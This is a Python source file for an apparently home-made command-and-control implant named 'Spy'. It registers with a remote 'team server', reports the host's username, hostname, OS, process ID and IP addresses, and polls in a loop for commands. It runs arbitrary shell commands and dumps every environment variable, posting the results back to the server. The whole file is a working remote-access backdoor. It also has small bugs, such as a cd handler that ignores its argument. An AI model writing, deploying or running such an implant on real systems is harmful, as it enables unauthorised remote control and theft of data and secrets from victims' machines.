import requests
from sys import argv
import time
import itertools
import random
import string
import platform
import getpass
import os
import socket
import urllib.request
import argparse
import base64
import aiohttp
import asyncio
import logging
import ctypes
import datetime  # Assuming you want to use datetime for timestamps

class Spy:
	def __init__(self):
		self.id = None
		self.guid = None
		self.active = False
		self.intaddr = None
		self.extaddr = None
		self.username = None
		self.hostname = None
		self.ops = None
		self.pid = None
		self.mission = None  # Initialize mission
		self.interval = None
		self.jitter = None
		self.firstcheckin = None
		self.lastcheckin = None
		self.output = None

	async def initial_checkin(self, intaddr, extaddr, username, hostname, ops, pid, server):
		self.active = True
		self.intaddr = intaddr
		self.extaddr = extaddr
		self.username = username
		self.hostname = hostname
		self.ops = ops
		self.pid = pid
		data = {
			"active": str(self.active),
			"intaddr": str(self.intaddr),
			"extaddr": str(self.extaddr),
			"username": str(self.username),
			"hostname": str(self.hostname),
			"ops": str(self.ops),
			"pid": self.pid
			}
		async with aiohttp.ClientSession() as session:
			async with session.post(f"{server}/register", json=data) as response:
				response_data = await response.json()
				print(response_data)
				self.id = int(response_data.get('id'))
				self.guid = response_data.get('guid')
				self.active = response_data.get('active')
				self.firstcheckin = response_data.get('firstcheckin')
				self.lastcheckin = response_data.get('lastcheckin')
		return response_data

class Command:
	def __init__(self, mission_id, command):
		self.mission_id=mission_id
		self.command=command

	def __eq__(self, other):
		return self.mission_id == other.mission_id

async def get_env(spy, server):
	ops = platform.system()
	username = getpass.getuser()
	pid = os.getpid()
	hostname = socket.gethostname()
	extaddr = urllib.request.urlopen('https://ident.me').read().decode('utf8')
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	s.connect(('8.8.8.8', 1))  # connect() for UDP doesn't send packets
	intaddr = s.getsockname()[0]

	await spy.initial_checkin(intaddr, extaddr, username, hostname, ops, pid, server)
	print("[+] Connected to the C2 server")
	print("[+] Spy GUID " + str(spy.guid))


async def cmd_shell(command):
    # Execute the command in a separate thread and then read the output
	popen_object = await asyncio.to_thread(os.popen, command)
	output=str(popen_object.read())
	print(output)
	return output


async def cmd_cd(newdir):
	os.chdir('newdir')
	return "Directory changed to "+newdir


async def cmd_whereami():
    # User information
	username = getpass.getuser()
	hostname = socket.gethostname()
	user_info = f"User Name: {hostname}\\{username}"

    # Basic system information as a substitute for group information
	system_info = f"OS: {platform.system()}\nOS Version: {platform.version()}\nMachine: {platform.machine()}\nProcessor: {platform.processor()}\nPython Version: {platform.python_version()}"

    # Environment variables as a substitute for privileges information
	env_vars = "\n".join([f"{key}: {value}" for key, value in dict(os.environ).items()])
	output=""
	output += "USER INFORMATION\n----------------\n" + user_info
	output += "\nSYSTEM INFORMATION\n------------------\n" + system_info
	output += "\nENVIRONMENT VARIABLES\n---------------------\n" + env_vars
	return output
	

#async def cmd_upload():


async def cmd_ls(dir):
	def get_file_attributes(path):
		attrs = ctypes.windll.kernel32.GetFileAttributesW(path)
		if attrs == -1:
			 return "----"
        
		attributes = ""
		attributes += 'd' if attrs & 0x10 else '-'
		attributes += 'r' if attrs & 0x1 else '-'
		attributes += 'h' if attrs & 0x2 else '-'
		attributes += 's' if attrs & 0x4 else '-'
		attributes += 'a' if attrs & 0x20 else '-'
		return attributes

    # Function to format file size
	def format_size(size):
		for unit in ['B', 'KB', 'MB', 'GB', 'TB']:
			if size < 1024.0:
				return f"{size:.2f} {unit}"
			size /= 1024.0
		return f"{size:.2f} TB"


	output = f" Directory of {dir}\n\n"
	output += " Mode    LastWriteTime         Size      Name\n"
	output += " ------  -------------         ----      ----\n"

    # Listing files and directories
	for entry in os.scandir(dir):
		mode = get_file_attributes(entry.path)
		last_write_time = datetime.datetime.fromtimestamp(entry.stat().st_mtime).strftime('%m/%d/%Y  %I:%M %p')
		size = format_size(entry.stat().st_size) if entry.is_file() else "<DIR>"
		output += f"{mode:<8} {last_write_time}  {size:<10} {entry.name}\n"

	return output



async def check_in(spy, server):	# Confirm the alive status, and return spy info in json format
	async with aiohttp.ClientSession() as session:
		async with session.get(f"{server}/spy/{spy.id}") as response:
			response_text = await response.text()  
			return await response.json()


async def main(ip, port):
	server = f"http://{ip}:{port}"
	newspy = Spy()
	await get_env(newspy, server)  
	cmdobjlist=[]
	while True:
		spy_data = await check_in(newspy, server)    # spy_data is single spy's json data
		for mission in spy_data['missionlist']:
			if not mission['iscompleted']:
				cmdobj=Command(mission['id'], mission['command'])
				if cmdobj not in cmdobjlist:
					print("Mission id: "+str(cmdobj.mission_id)+" Mission command "+cmdobj.command)
					cmdobjlist.append(cmdobj)
		if cmdobjlist:	# If more than 1 command are not completed
			for cmdobj in cmdobjlist:
				cmd_maincmd=' '.join(cmdobj.command.split()[0:1])
				cmd_subcmd = ' '.join(cmdobj.command.split()[1:])
				if cmd_maincmd =='shell':
					result = await cmd_shell(cmd_subcmd)
				if cmd_maincmd =='cd':
					if cmd_subcmd =='':
						cmd_subcmd=os.getcwd()
					result = await cmd_cd(cmd_subcmd)				

				if cmd_maincmd =='ls':
					if cmd_subcmd =='':
						cmd_subcmd=os.getcwd()
					result = await cmd_ls(cmd_subcmd)

				if cmd_maincmd =='whereami':
					result = await cmd_whereami()
				
				
				result_bytes = result.encode("ascii")
				base64_bytes = base64.b64encode(result_bytes)
				output = base64_bytes.decode("ascii")
				cmdobjlist.remove(cmdobj)
				async with aiohttp.ClientSession() as session:
					await session.post(f'{server}/spy/{newspy.id}/{cmdobj.mission_id}/output', json={"output": result})
		await asyncio.sleep(3)

if __name__ == "__main__":
	parser = argparse.ArgumentParser()
	parser.add_argument('--ip', '-i',required=True,dest='ip',help='Team server IP')
	parser.add_argument('--port', '-p',required=True,dest='port',help='Port of the listener')
	args = parser.parse_args()
	ip = args.ip
	port = args.port
	asyncio.run(main(ip, port))
